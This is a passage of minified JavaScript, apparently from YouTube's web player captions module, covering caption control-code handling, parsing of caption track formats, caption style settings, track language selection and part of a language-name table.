          c & 32 && k5(b.j, 2, c & 31);
          break;
        case 3:
          c & 32 && k5(b.j, 3, c & 31);
          break;
        case 4:
        case 5:
          if (32 <= c && 47 >= c) switch (c) {
            case 32:
              ukb(b);
              break;
            case 33:
              d = b.j;
              1 < d.col && (--d.col, j5(d).j = 0);
              break;
            case 36:
              d = b.j;
              b = j5(d);
              for (a = 0; 15 >= a; a++) for (c = 0; 32 >= c; c++) if (d.B[a][c] === b) {
                for (; 32 >= c; c++) d.B[a][c].reset();
                break;
              }
              break;
            case 37:
              tkb(b, 2, d);
              break;
            case 38:
              tkb(b, 3, d);
              break;
            case 39:
              tkb(b, 4, d);
              break;
            case 40:
              k5(b.j, 0, 32);
              break;
            case 41:
              b.style.set(2);
              b.j = b.B;
              b.j.j = 0;
              b.j.style = b.style;
              b.C.mode = 1 << b.j.C;
              break;
            case 42:
              d = b.text;
              d.j = 15;
              d.style.set(4);
              rkb(d);
              vkb(b);
              break;
            case 43:
              vkb(b);
              break;
            case 44:
              a = b.B;
              switch (b.style.get()) {
                case 1:
                case 2:
                case 3:
                  i5(a, d);
              }
              l5(a, 0, 15);
              break;
            case 45:
              b: {
                a = b.j;
                switch (b.style.get()) {
                  default:
                  case 2:
                  case 1:
                    break b;
                  case 4:
                    if (15 > a.row) {
                      ++a.row;
                      a.col = 1;
                      break b;
                    }
                  case 3:
                }
                2 > a.j && (a.j = 2, a.row < a.j && (a.row = a.j));
                b = a.row - a.j + 1;
                i5(a, d);
                qkb(a, b, b + 1, a.j - 1);
                l5(a, a.row, 1);
              }
              break;
            case 46:
              l5(b.D, 0, 15);
              break;
            case 47:
              i5(b.B, d), b.D.updateTime(b.C.time + 0), d = b.D, b.D = b.B, b.B = d, ukb(b);
          }
          break;
        case 7:
          switch (c) {
            case 33:
            case 34:
            case 35:
              d = b.j, 32 < (d.col += c & 3) && (d.col = 32);
          }
      }
    },
    wkb = function () {},
    m5 = function (a, b, c) {
      this.trackData = a;
      this.K = c;
      this.version = this.G = this.C = this.byteOffset = 0;
      this.j = new DataView(this.trackData);
      this.B = [];
    },
    n5 = function (a) {
      var b = a.byteOffset;
      a.byteOffset += 1;
      return a.j.getUint8(b);
    },
    o5 = function (a) {
      var b = a.byteOffset;
      a.byteOffset += 4;
      return a.j.getUint32(b);
    },
    p5 = function (a, b) {
      X4.call(this);
      this.C = a;
      this.D = b;
      this.track = "CC3" === this.D.languageName ? 4 : 0;
      this.j = new ekb();
      this.j.B = 1 << this.track;
    },
    ykb = function (a) {
      if ("string" === typeof a) return !1;
      a = new m5(a, 8, 0);
      return xkb(a);
    },
    xkb = function (a) {
      if (!(a.byteOffset < a.j.byteLength) || 1380139777 !== o5(a)) return !1;
      a.version = n5(a);
      if (1 < a.version) return !1;
      n5(a);
      n5(a);
      n5(a);
      return !0;
    },
    q5 = function () {
      X4.call(this);
    },
    zkb = function (a, b, c, d, e, f, h, l, m) {
      switch (h.tagName) {
        case "b":
          l.bold = !0;
          break;
        case "i":
          l.italic = !0;
          break;
        case "u":
          l.underline = !0;
      }
      for (var n = 0; n < h.childNodes.length; n++) {
        var p = h.childNodes[n];
        if (3 === p.nodeType) p = new U4(b, c, d, e.id, p.nodeValue, f || 0 < n, g.dd(l) ? void 0 : l), m.push(p), e.j.push(p);else {
          var q = {};
          Object.assign(q, l);
          zkb(a, b, c, d, e, !0, p, q, m);
        }
      }
    },
    Akb = function (a) {
      var b = a.split(":");
      a = 0;
      b = g.v(b);
      for (var c = b.next(); !c.done; c = b.next()) a = 60 * a + Number(c.value);
      return 1E3 * a;
    },
    Bkb = function (a, b, c, d) {
      d = Object.assign({
        kA: 0
      }, d);
      return new V4(a, b, c, "_" + W4++, d);
    },
    r5 = function (a, b) {
      g.G.call(this);
      this.J = a;
      this.Z = b;
      this.parser = null;
      this.j = this.J.xz();
    },
    Hkb = function (a, b, c, d, e) {
      d = d || 0;
      e = e || 0;
      if (a.j && b) {
        var f = e,
          h = Ckb(a, b, d),
          l = [];
        try {
          for (var m = g.v(h), n = m.next(); !n.done; n = m.next()) {
            var p = n.value,
              q = p.trackData,
              t = p.qR;
            l = "string" !== typeof q ? l.concat(Dkb(a, c, q, t, f)) : "WEBVTT" === q.substring(0, 6) ? l.concat(Ekb(a, q, t)) : l.concat(Fkb(a, c, q, t));
          }
          var u = l;
        } catch (y) {
          g.UF(y), a.clear(), u = [];
        }
        if (0 !== u.length) return u;
      }
      b = Gkb(b);
      if (!b) return [];
      try {
        return "string" !== typeof b ? Dkb(a, c, b, d, e) : "WEBVTT" === b.substring(0, 6) ? Ekb(a, b, d) : Fkb(a, c, b, d);
      } catch (y) {
        return g.UF(y), a.clear(), [];
      }
    },
    Gkb = function (a) {
      if ("string" === typeof a || ykb(a)) return a;
      var b = new DataView(a);
      if (8 >= b.byteLength || 1718909296 !== b.getUint32(4)) return "";
      b = g.gI(b, 0, 1835295092);
      if (!b || !b.size) return "";
      a = new Uint8Array(a, b.dataOffset, b.size - (b.dataOffset - b.offset));
      return g.VH(a);
    },
    Ckb = function (a, b, c) {
      if ("string" === typeof b || ykb(b)) return [{
        trackData: b,
        qR: c
      }];
      var d = new DataView(b);
      if (8 >= d.byteLength || 1718909296 !== d.getUint32(4)) return [];
      var e = g.Kua(d);
      if (a.j && e) {
        var f = g.Bua(e),
          h = g.Cua(e);
        e = e.j;
        f && e && a.j.GF(e, f, h);
      }
      a = g.nI(d, 1835295092);
      if (!a || !a.length || !a[0].size) return [];
      f = [];
      for (h = 0; h < a.length; h++) e = a[h], e = new Uint8Array(b, e.dataOffset, e.size - (e.dataOffset - e.offset)), e = g.VH(e), f.push({
        trackData: e,
        qR: c + 1E3 * h
      });
      Ikb(d, f, c);
      return f = f.filter(function (l) {
        return !!l.trackData;
      });
    },
    Ikb = function (a, b, c) {
      var d = g.gI(a, 0, 1836476516),
        e = 9E4;
      d && (e = g.hI(d) || 9E4);
      d = 0;
      for (var f = g.nI(a, 1836019558), h = 0; h < f.length; h++) {
        var l = f[h];
        h < b.length && (l = g.gI(a, l.dataOffset, 1953653094)) && (l = g.gI(a, l.dataOffset, 1952867444)) && (l = g.Hua(l) / e * 1E3, 0 === h && (d = l), b[h].qR = l - d + c || c * h * 1E3);
      }
    },
    Dkb = function (a, b, c, d, e) {
      if (!ykb(c)) throw Error("Invalid binary caption track data");
      a.parser || (a.parser = new p5(e, b));
      return a.parser.B(c, d);
    },
    Ekb = function (a, b, c) {
      a.parser || (a.parser = new q5());
      a = a.parser.B(b, c);
      .01 > Math.random() && g.VF(Error("Deprecated subtitles format in web player: WebVTT"));
      return a;
    },
    Fkb = function (a, b, c, d) {
      if ("{" === c[0]) try {
        return a.parser || (a.parser = new d5(Jkb(b))), a.parser.B(c, d);
      } catch (f) {
        return g.UF(f), [];
      }
      var e = g.Mbb(c);
      if (!e || !e.firstChild) throw a = Error("Invalid caption track data"), a.params = c, a;
      if ("timedtext" === e.firstChild.tagName) {
        if (3 === Number(e.firstChild.getAttribute("format"))) return a.parser || (a.parser = new Y4(Jkb(b), a.Z)), a.parser.B(e, d);
        a = Error("Unsupported subtitles format in web player (Format2)");
        a.params = c;
        throw a;
      }
      if ("transcript" === e.firstChild.tagName) throw a = Error("Unsupported subtitles format in web player (Format1)"), a.params = c, a;
      a = Error("Invalid caption track data");
      a.params = c;
      throw a;
    },
    Jkb = function (a) {
      var b = {};
      if (a = g.lM(a)) b.lang = a, g.Ndb.test(a) && (b.Ji = 1);
      return b;
    },
    s5 = function (a) {
      g.dT.call(this, a);
      var b = this;
      this.J = a;
      this.Z = this.J.W();
      this.videoData = this.J.getVideoData();
      this.zb = this.J.sb();
      this.C = {
        Xe: {}
      };
      this.G = {
        Xe: {}
      };
      this.Ga = [];
      this.ra = {};
      this.Za = {};
      this.va = !1;
      this.zc = g.UN(this.videoData);
      this.ob = g.wPa(this.videoData, this.J);
      this.Zb = !!this.videoData.captionTracks.length;
      this.Ac = !!this.videoData.Kd;
      this.fb = "3" === this.Z.controlsType;
      this.j = this.S = this.ma = this.Va = this.tb = null;
      this.kb = new r5(this.J, this.Z);
      this.B = null;
      this.Ja = new g.tJ(this);
      this.K = new g.X({
        I: "div",
        T: "ytp-caption-window-container",
        Y: {
          id: "ytp-caption-window-container"
        }
      });
      this.ea = {
        top: 0,
        right: 0,
        bottom: 0,
        left: 0,
        width: 1,
        height: 1
      };
      var c = null,
        d = g.ns("yt-html5-player-modules::subtitlesModuleData");
      d && (c = new g.Kr(d));
      this.storage = c;
      var e;
      this.Hb = !(null == (e = a.Pe()) || !e.zF());
      this.D = Kkb(this);
      this.Ca = !this.D && this.fb && this.Hb && this.ob;
      g.H(this, this.kb);
      this.D ? this.Pa = this.Oa = null : (this.Oa = new g.dr(this.QR, void 0, this), g.H(this, this.Oa), this.Pa = new g.fr(this.caa, 2E3, this), g.H(this, this.Pa));
      g.H(this, this.Ja);
      g.cS(this.player, this.K.element, 4);
      g.H(this, this.K);
      this.D || this.Ja.V(a, "resize", this.SR);
      (this.Vb = g.AL(this.Z) && !g.zB() && !this.J.isFullscreen() && !this.D && !this.Ca) && this.Ja.V(a, "resize", this.L8);
      this.Ja.V(a, "onPlaybackAudioChange", this.d8);
      this.Ja.V(a, g.oG("captions"), function (f) {
        b.onCueRangeEnter(f);
      });
      this.Ja.V(a, g.pG("captions"), function (f) {
        b.onCueRangeExit(f);
      });
      Lkb(this, Bjb() || {});
      this.player.Ra("onCaptionsModuleAvailable");
    },
    Okb = function (a) {
      if (1 === a.Z.zc || 1 === a.videoData.SE || "alwayson" === g.CN(a.videoData, "yt:cc")) return !0;
      if (a.videoData.captionTracks.length) var b = a.player.getAudioTrack().B;
      if (2 === a.Z.zc) {
        if (g.QL(a.Z)) var c = Mkb(a);else if (a.storage) try {
          c = a.storage.get("module-enabled");
        } catch (e) {
          a.storage.remove("module-enabled");
        } else c = null;
        if (null != c) return !!c;
      }
      c = ujb(a.player.getAudioTrack(), g.QL(a.Z));
      var d = g.CN(a.videoData, "yt:cc");
      if (void 0 === Nkb(a)) {
        if ("CAPTIONS_INITIAL_STATE_ON_RECOMMENDED" === c) return d ? "on" === d : !0;
        if ("CAPTIONS_INITIAL_STATE_OFF_RECOMMENDED" === c) return "on" === d;
      } else return "on" === d;
      return "ON" === b || "on" === g.CN(a.videoData, "yt:cc");
    },
    t5 = function (a, b) {
      if (a.B && (void 0 === b || !b) || !a.videoData.captionTracks.length) return !1;
      a = a.player.getAudioTrack();
      return !!a.j || "FORCED_ON" === a.B;
    },
    Nkb = function (a) {
      var b = void 0,
        c = g.ZB(g.YB(), 65);
      if (g.QL(a.Z) && null != c) {
        if (null != Mkb(a)) return !1;
        b = !c;
      }
      return b;
    },
    Pkb = function (a) {
      return a.Z.N("html5_honor_caption_availabilities_in_audio_track") && !a.ob;
    },
    Qkb = function (a) {
      var b;
      a.zc ? b = new R4(a.Z, a.videoData, a.player.getAudioTrack(), a.player) : a.ob ? b = new P4(a.videoData.j, a.player) : a.Zb ? b = new g.hT(a.Z, a.videoData, a.player.getAudioTrack()) : b = new g.mT(a.Z, a.videoData.Kd, a.videoData.videoId, g.IBa(a.videoData), a.videoData.Lm, a.videoData.eventId);
      return b;
    },
    v5 = function (a, b) {
      if (a.j) {
        if (a.S && a.S.D) return a.S.D;
        g.NN(a.videoData) && (b = !0);
        b || (b = a.Ac ? !1 : a.Zb ? !1 : !0);
        b = b || Rkb(a);
        b = g.eT(a.j.j, b);
        var c = null;
        if (g.QL(a.Z)) {
          var d = a.J.isInline() ? void 0 : g.SB("yt-player-caption-sticky-language");
          for (var e = [d, a.videoData.captionsLanguagePreference, a.Z.captionsLanguagePreference, g.CN(a.videoData, "yt:cc_default_lang")], f = !1, h = 0; h < e.length; h++) {
            var l = e[h];
            if (l) {
              f = !0;
              for (var m = 0; m < b.length; m++) if (g.lM(b[m]) === l) return b[m];
              m = l.split("-")[0];
              for (var n = 0; n < b.length; n++) if (a.Z.N("html5_enable_same_language_id_matching")) {
                if (g.lM(b[n]).split("-")[0] === l.split("-")[0]) return b[n];
              } else if (g.lM(b[n]) === m) return b[n];
            }
          }
          if (f && a.j && (e = a.j.D, e.length)) for (e = g.v(e), f = e.next(); !f.done; f = e.next()) if (f = f.value, f.languageCode === d) {
            c = f;
            break;
          }
        } else for (d = [a.videoData.captionsLanguagePreference, a.Z.captionsLanguagePreference, g.CN(a.videoData, "yt:cc_default_lang")], e = 0; e < d.length; e++) for (f = 0; f < b.length; f++) if (g.lM(b[f]) === d[e]) return b[f];
        d = null;
        a.S && a.S.C && (d = a.S.C);
        d || (d = b.find(function (p) {
          return p.isDefault;
        }) || null);
        d || (d = b[0] || u5(a));
        !d || !c || a.Z.N("html5_enable_same_language_id_matching") && g.lM(d).split("-")[0] === c.languageCode.split("-")[0] || (d = vjb(d, c));
        return d;
      }
      return null;
    },
    u5 = function (a) {
      return a.S && a.S.j;
    },
    w5 = function (a) {
      var b = u5(a);
      return !!b && a.B === b;
    },
    Skb = function (a) {
      g.eT(a.j.j, !0);
      var b = ujb(a.player.getAudioTrack(), g.QL(a.Z)),
        c;
      "CAPTIONS_INITIAL_STATE_ON_REQUIRED" === b ? c = v5(a, a.va) : "CAPTIONS_INITIAL_STATE_OFF_REQUIRED" === b && t5(a) ? c = u5(a) : Nkb(a) || a.va || Okb(a) ? c = v5(a, a.va) : t5(a) && (c = u5(a));
      if (a.D || a.Ca) {
        var d = g.eT(a.j.j, !0);
        b = [];
        for (var e = 0; e < d.length; e++) {
          var f = d[e],
            h = g.Te("TRACK");
          h.setAttribute("kind", "subtitles");
          h.setAttribute("label", g.jM(f));
          h.setAttribute("srclang", g.lM(f));
          h.setAttribute("id", f.toString());
          a.Ca || h.setAttribute("src", a.j.Vv(f, "vtt"));
          f === c && h.setAttribute("default", "1");
          b.push(h);
        }
        c = a.J.Pe();
        c.jC(b);
        c = c.Cb();
        a.Hb && a.Ja.V(c.textTracks, "change", a.j$);
      } else !a.B && c && x5(a, c), a.player.Ra("onCaptionsTrackListChanged"), a.player.Ra("onApiChange");
    },
    Tkb = function (a, b) {
      var c = a.J.Pe().Cb().textTracks;
      a = a.B.toString();
      for (var d = 0; d < c.length; d++) {
        var e = c[d];
        e.id === a && (b ? "showing" !== e.mode && (e.mode = "showing") : "showing" === e.mode && (e.mode = "disabled"));
      }
    },
    x5 = function (a, b, c) {
      a.loaded && a.unload();
      null != c && (a.va = c, a.va && (g.QL(a.Z) ? y5(a, !!b) : z5(a, !!b)));
      a.B = b;
      t5(a) && (a.B = u5(a));
      var d;
      Ukb(a, null != (d = a.B) ? d : void 0);
      a.load();
    },
    Wkb = function (a, b) {
      if (b instanceof V4) {
        var c = a.ra[b.id];
        c && c.B !== b && (c.dispose(), delete a.ra[b.id], c = null);
        c || (c = Vkb(a, b)) && (a.ra[b.id] = c);
      } else c = b.windowId, a.Za[c] || (a.Za[c] = []), a.Za[c].push(b);
    },
    Vkb = function (a, b) {
      var c = Xkb(a);
      if (!c) return null;
      var d = a.B ? g.lM(a.B) : null;
      d && g.Ndb.test(d) && (b.params.Ji = 1);
      var e = a.zb.getPlayerSize();
      d = e.height * a.ea.height;
      e = e.width * a.ea.width;
      "google-live" !== a.Z.playerStyle || a.C.isDefault || Object.assign(b.params, a.C);
      switch (null != b.params.kA ? b.params.kA : 1 < b.j.length ? 1 : 0) {
        case 1:
          return new S4(b, a.C, a.G, c.width, c.height, e, d, a.Z.experiments, a.DK.bind(a), a.J);
        case 2:
          return new T4(b, a.C, a.G, c.width, c.height, e, d, a.Z.experiments, a.DK.bind(a), a.J);
        default:
          return new Q4(b, a.C, a.G, c.width, c.height, e, d, a.Z.experiments, a.DK.bind(a), a.J);
      }
    },
    Lkb = function (a, b, c) {
      c = void 0 === c ? !1 : c;
      var d = A5.Xe;
      a.C = {};
      Object.assign(a.C, A5);
      a.C.Xe = {};
      Object.assign(a.C.Xe, d);
      a.G = {
        Xe: {}
      };
      var e = b.backgroundOverride ? a.G : a.C,
        f = b.background || d.background;
      b5.test(f);
      e.Xe.background = f;
      e = b.colorOverride ? a.G : a.C;
      f = b.color || d.color;
      b5.test(f);
      e.Xe.color = f;
      e = b.windowColorOverride ? a.G : a.C;
      f = b.windowColor || A5.windowColor;
      b5.test(f);
      e.windowColor = f;
      e = b.backgroundOpacityOverride ? a.G : a.C;
      f = b.backgroundOpacity;
      null == f && (f = d.backgroundOpacity);
      e.Xe.backgroundOpacity = f;
      e = b.fontSizeIncrementOverride ? a.G : a.C;
      f = b.fontSizeIncrement;
      null == f && (f = d.fontSizeIncrement);
      e.Xe.fontSizeIncrement = f;
      f = b.fontStyleOverride ? a.G : a.C;
      e = b.fontStyle;
      null == e && (e = d.bold && d.italic ? 3 : d.bold ? 1 : d.italic ? 2 : 0);
      f = f.Xe;
      switch (e) {
        case 1:
          f.bold = !0;
          delete f.italic;
          break;
        case 2:
          delete f.bold;
          f.italic = !0;
          break;
        case 3:
          f.bold = !0;
          f.italic = !0;
          break;
        default:
          delete f.bold, delete f.italic;
      }
      e = b.textOpacityOverride ? a.G : a.C;
      f = b.textOpacity;
      null == f && (f = d.textOpacity);
      e.Xe.textOpacity = f;
      e = b.windowOpacityOverride ? a.G : a.C;
      f = b.windowOpacity;
      null == f && (f = A5.windowOpacity);
      e.windowOpacity = f;
      e = b.charEdgeStyleOverride ? a.G : a.C;
      f = b.charEdgeStyle;
      null == f && (f = d.charEdgeStyle);
      e.Xe.charEdgeStyle = f;
      e = b.fontFamilyOverride ? a.G : a.C;
      f = b.fontFamily;
      null == f && (f = d.fontFamily);
      e.Xe.fontFamily = f;
      a.loaded && a.SR();
      c && g.RB("yt-player-caption-display-settings", b, 2592E3);
    },
    Zkb = function (a, b, c) {
      b && !a.ma ? (b = Xjb({
        Ji: 0,
        lang: "en"
      }), a.ma = [b, new U4(b.start, b.end - b.start, 0, b.id, null != c ? c : "Captions look like this")], a.player.jf(a.ma)) : !b && a.ma && (Ykb(a, a.ma), a.ma = null);
    },
    Ykb = function (a, b) {
      a.player.Up(b);
      b = g.v(b);
      for (var c = b.next(); !c.done; c = b.next()) g.Fb(a.Ga, c.value);
      g.er(a.Oa);
    },
    Ukb = function (a, b) {
      a.Z.N("html5_modify_caption_vss_logging") && (a.videoData.NB = b);
    },
    Xkb = function (a) {
      var b = a.zb.getVideoContentRect(!0).height,
        c = a.zb.getVideoContentRect(!0).width;
      if (!b || !c) return null;
      b *= a.ea.height;
      c *= a.ea.width;
      return {
        width: c,
        height: b
      };
    },
    z5 = function (a, b) {
      if (a.storage) try {
        a.storage.set("module-enabled", b);
      } catch (c) {}
    },
    y5 = function (a, b) {
      a.J.isInline() || g.RB("yt-player-sticky-caption", b, 2592E3);
    },
    Mkb = function (a) {
      if (!a.J.isInline()) return g.SB("yt-player-sticky-caption");
    },
    Kkb = function (a) {
      var b,
        c = !(null == (b = a.J.Pe()) || !b.yF());
      return a.fb && c && !a.ob;
    },
    Rkb = function (a) {
      return a.Z.N("web_deprecate_always_includes_asr_setting") && g.QL(a.Z) ? !0 : !!g.ZB(g.YB(), 66);
    };
  g.mW.prototype.YC = g.ba(41, function (a) {
    var b = 2;
    this.Ca.has(a) ? b = 0 : g.xVa(this, a) && (b = 1);
    return b;
  });
  g.xY.prototype.YC = g.ba(40, function (a) {
    return this.od.YC(a);
  });
  g.mW.prototype.GF = g.ba(39, function (a, b, c) {
    this.Va.set(a, {
      Vs: b,
      Cy: c
    });
  });
  let globalVariableCollector = {};
  g.xY.prototype.GF = g.ba(38, function (a, b, c) {
    this.od.GF(a, b, c);
  });
  g.gT.prototype.nQ = g.ba(31, function () {
    return !1;
  });
  g.gT.prototype.Tt = g.ba(30, function () {});
  g.hT.prototype.Tt = g.ba(29, function (a, b, c) {
    var d = this;
    this.isDisposed();
    b = this.Vv(a, b);
    this.ws();
    this.B = g.GA(b, {
      format: "RAW",
      onSuccess: function (e) {
        d.B = null;
        c(e.responseText, a);
      },
      withCredentials: !0
    });
  });
  g.mT.prototype.Tt = g.ba(28, function (a, b, c) {
    var d = this;
    this.isDisposed();
    b = this.Vv(a, b);
    this.ws();
    this.B = g.GA(b, {
      format: "RAW",
      onSuccess: function (e) {
        d.B = null;
        c(e.responseText, a);
      },
      withCredentials: !0
    });
  });
  g.OS.prototype.Py = g.ba(27, function () {
    for (var a = g.Le(document, "track", void 0, this.j), b = 0; b < a.length; b++) g.ff(a[b]);
  });
  g.$V.prototype.Py = g.ba(26, function () {
    this.mediaElement.Py();
  });
  g.OS.prototype.zF = g.ba(25, function () {
    return !(!this.j.textTracks || !this.j.textTracks.addEventListener);
  });
  g.$V.prototype.zF = g.ba(24, function () {
    return this.mediaElement.zF();
  });
  g.OS.prototype.yF = g.ba(23, function () {
    return !!this.j.textTracks;
  });
  g.$V.prototype.yF = g.ba(22, function () {
    return this.mediaElement.yF();
  });
  g.OS.prototype.jC = g.ba(21, function (a) {
    for (var b = 0; b < a.length; b++) this.j.appendChild(a[b]);
  });
  g.$V.prototype.jC = g.ba(20, function (a) {
    this.mediaElement.jC(a);
  });
  g.pY.prototype.nD = g.ba(10, function () {
    return this.ma;
  });
  g.DZ.prototype.nD = g.ba(9, function () {
    var a;
    return (null == (a = g.KR(this)) ? void 0 : a.xz()) || null;
  });
  g.UR.prototype.xz = g.ba(8, function () {
    return this.app.nD();
  });
  g.qZ.prototype.xz = g.ba(7, function () {
    var a;
    return (null == (a = this.Ea) ? void 0 : a.nD()) || null;
  });
  g.MH.prototype.GH = g.ba(3, function (a) {
    return (a = this.cn(a)) ? a.j : 0;
  });
  g.Tva.prototype.GH = g.ba(2, function () {
    return 0;
  });
  var zjb = /#(.)(.)(.)/,
    yjb = /^#(?:[0-9a-f]{3}){1,2}$/i,
    Gjb = {
      aa: "Afar",
      ab: "Abkhazian",
      ace: "Achinese",
      ach: "Acoli",
      ada: "Adangme",
      ady: "Adyghe",
      ae: "Avestan",
      aeb: "Tunisian Arabic",
      af: "Afrikaans",
      afh: "Afrihili",
      agq: "Aghem",
      ain: "Ainu",
      ak: "Akan",
      akk: "Akkadian",
      akz: "Alabama",
      ale: "Aleut",
      aln: "Gheg Albanian",
      alt: "Southern Altai",
      am: "Amharic",
      an: "Aragonese",
      ang: "Old English",
      anp: "Angika",
      ar: "Arabic",
      ar_001: "Arabic (world)",
      arc: "Aramaic",
      arn: "Mapuche",
      aro: "Araona",
      arp: "Arapaho",
      arq: "Algerian Arabic",
      ars: "Najdi Arabic",
      arw: "Arawak",
      ary: "Moroccan Arabic",
      arz: "Egyptian Arabic",
      as: "Assamese",
      asa: "Asu",
      ase: "American Sign Language",
      ast: "Asturian",
      av: "Avaric",
      avk: "Kotava",
      awa: "Awadhi",
      ay: "Aymara",
      az: "Azerbaijani",
      az_Cyrl: "Azerbaijani (Cyrillic)",
      az_Latn: "Azerbaijani (Latin)",
      ba: "Bashkir",
      bal: "Baluchi",
      ban: "Balinese",
      bar: "Bavarian",
      bas: "Basaa",
      bax: "Bamun",
      bbc: "Batak Toba",
      bbj: "Ghomala",
      be: "Belarusian",
      bej: "Beja",
      bem: "Bemba",
      bew: "Betawi",
      bez: "Bena",
      bfd: "Bafut",
      bfq: "Badaga",
      bg: "Bulgarian",
      bgc: "Haryanvi",
      bgn: "Western Balochi",
      bho: "Bhojpuri",
      bi: "Bislama",
      bik: "Bikol",
      bin: "Bini",
      bjn: "Banjar",
      bkm: "Kom",
      bla: "Siksik\u00e1",
      bm: "Bambara",
      bn: "Bangla",
      bo: "Tibetan",
      bpy: "Bishnupriya",
      bqi: "Bakhtiari",
      br: "Breton",
      bra: "Braj",
      brh: "Brahui",
      brx: "Bodo",
      bs: "Bosnian",
      bs_Cyrl: "Bosnian (Cyrillic)",
      bs_Latn: "Bosnian (Latin)",
      bss: "Akoose",
      bua: "Buriat",
      bug: "Buginese",
      bum: "Bulu",
      byn: "Blin",
      byv: "Medumba",
      ca: "Catalan",
      cad: "Caddo",
      car: "Carib",
      cay: "Cayuga",
      cch: "Atsam",
      ccp: "Chakma",
      ce: "Chechen",
      ceb: "Cebuano",
      cgg: "Chiga",
      ch: "Chamorro",
      chb: "Chibcha",
      chg: "Chagatai",
      chk: "Chuukese",
      chm: "Mari",
      chn: "Chinook Jargon",
      cho: "Choctaw",
      chp: "Chipewyan",
      chr: "Cherokee",
      chy: "Cheyenne",
      ckb: "Central Kurdish",
      ckb_Arab: "Central Kurdish (Arabic)",
      co: "Corsican",
      cop: "Coptic",
      cps: "Capiznon",
      cr: "Cree",
      crh: "Crimean Tatar",
      cs: "Czech",
      csb: "Kashubian",
      cu: "Church Slavic",
      cv: "Chuvash",
      cy: "Welsh",
      da: "Danish",
      dak: "Dakota",
      dar: "Dargwa",
      dav: "Taita",
      de: "German",
      de_AT: "German (Austria)",
      de_CH: "German (Switzerland)",
      del: "Delaware",
      den: "Slave",
      dgr: "Dogrib",
      din: "Dinka",
      dje: "Zarma",
      doi: "Dogri",
      dsb: "Lower Sorbian",
      dua: "Duala",
      dum: "Middle Dutch",
      dv: "Divehi",
      dyo: "Jola-Fonyi",
      dyu: "Dyula",
      dz: "Dzongkha",
      dzg: "Dazaga",
      ebu: "Embu",
      ee: "Ewe",
      efi: "Efik",
      egy: "Ancient Egyptian",
      eka: "Ekajuk",
      el: "Greek",
      elx: "Elamite",
      en: "English",
      en_AU: "English (Australia)",
      en_CA: "English (Canada)",
      en_GB: "English (United Kingdom)",
      en_US: "English (United States)",
      enm: "Middle English",
      eo: "Esperanto",
      es: "Spanish",
      es_419: "Spanish (Latin America)",
      es_ES: "Spanish (Spain)",
      es_MX: "Spanish (Mexico)",
      et: "Estonian",
      eu: "Basque",
      ewo: "Ewondo",
      fa: "Persian",
      fa_AF: "Persian (Afghanistan)",
      fan: "Fang",
      fat: "Fanti",
      ff: "Fula",
      ff_Adlm: "Fula (Adlam)",
      ff_Latn: "Fula (Latin)",
      fi: "Finnish",
      fil: "Filipino",
      fj: "Fijian",
      fo: "Faroese",
      fon: "Fon",
      fr: "French",
      fr_CA: "French (Canada)",
      fr_CH: "French (Switzerland)",
      frm: "Middle French",
      fro: "Old French",
      frr: "Northern Frisian",
      frs: "Eastern Frisian",
      fur: "Friulian",
      fy: "Western Frisian",
      ga: "Irish",
      gaa: "Ga",
      gay: "Gayo",
      gba: "Gbaya",
      gd: "Scottish Gaelic",
      gez: "Geez",
      gil: "Gilbertese",
      gl: "Galician",
      gmh: "Middle High German",
      gn: "Guarani",
      goh: "Old High German",
      gon: "Gondi",
      gor: "Gorontalo",
      got: "Gothic",
      grb: "Grebo",
      grc: "Ancient Greek",
      gsw: "Swiss German",
      gu: "Gujarati",
      guz: "Gusii",
      gv: "Manx",
      gwi: "Gwich\u02bcin",
      ha: "Hausa",
      hai: "Haida",
      haw: "Hawaiian",
      he: "Hebrew",
      hi: "Hindi",
      hi_Latn: "Hindi (Latin)",
      hil: "Hiligaynon",
      hit: "Hittite",
      hmn: "Hmong",
      ho: "Hiri Motu",
      hr: "Croatian",
      hsb: "Upper Sorbian",
      ht: "Haitian Creole",
      hu: "Hungarian",
      hup: "Hupa",
      hy: "Armenian",
      hz: "Herero",
      ia: "Interlingua",
      iba: "Iban",
      ibb: "Ibibio",
      id: "Indonesian",
      ie: "Interlingue",
      ig: "Igbo",
      ii: "Sichuan Yi",
      ik: "Inupiaq",
      ilo: "Iloko",
      "in": "Indonesian",
      inh: "Ingush",
      io: "Ido",
      is: "Icelandic",
      it: "Italian",
      iu: "Inuktitut",
      iw: "Hebrew",
      ja: "Japanese",
      jbo: "Lojban",
      jgo: "Ngomba",
      jmc: "Machame",
      jpr: "Judeo-Persian",
      jrb: "Judeo-Arabic",
      jv: "Javanese",
      ka: "Georgian",
      kaa: "Kara-Kalpak",
      kab: "Kabyle",
      kac: "Kachin",
      kaj: "Jju",
      kam: "Kamba",
      kaw: "Kawi",
      kbd: "Kabardian",
      kbl: "Kanembu",
      kcg: "Tyap",
      kde: "Makonde",
      kea: "Kabuverdianu",
      kfo: "Koro",
      kg: "Kongo",
      kgp: "Kaingang",
      kha: "Khasi",
      kho: "Khotanese",
      khq: "Koyra Chiini",
      ki: "Kikuyu",
      kj: "Kuanyama",
      kk: "Kazakh",
      kkj: "Kako",
      kl: "Kalaallisut",
      kln: "Kalenjin",
      km: "Khmer",
      kmb: "Kimbundu",
      kn: "Kannada",
      ko: "Korean",
      kok: "Konkani",
      kos: "Kosraean",
      kpe: "Kpelle",
      kr: "Kanuri",
      krc: "Karachay-Balkar",
      krl: "Karelian",
      kru: "Kurukh",
      ks: "Kashmiri",
      ks_Arab: "Kashmiri (Arabic)",
      ks_Deva: "Kashmiri (Devanagari)",
      ksb: "Shambala",
      ksf: "Bafia",
      ksh: "Colognian",
      ku: "Kurdish",
      kum: "Kumyk",
      kut: "Kutenai",
      kv: "Komi",
      kw: "Cornish",
      ky: "Kyrgyz",
      la: "Latin",
      lad: "Ladino",
      lag: "Langi",
      lah: "Western Panjabi",
      lam: "Lamba",
      lb: "Luxembourgish",
      lez: "Lezghian",
      lg: "Ganda",
      li: "Limburgish",
      lkt: "Lakota",
      ln: "Lingala",
      lo: "Lao",
      lol: "Mongo",
      loz: "Lozi",
      lrc: "Northern Luri",
      lt: "Lithuanian",
      lu: "Luba-Katanga",
      lua: "Luba-Lulua",
      lui: "Luiseno",
      lun: "Lunda",
      luo: "Luo",
      lus: "Mizo",
      luy: "Luyia",
      lv: "Latvian",
      mad: "Madurese",
      maf: "Mafa",
      mag: "Magahi",
      mai: "Maithili",
      mak: "Makasar",
      man: "Mandingo",
      mas: "Masai",
      mde: "Maba",
      mdf: "Moksha",
      mdr: "Mandar",
      men: "Mende",
      mer: "Meru",
      mfe: "Morisyen",
      mg: "Malagasy",
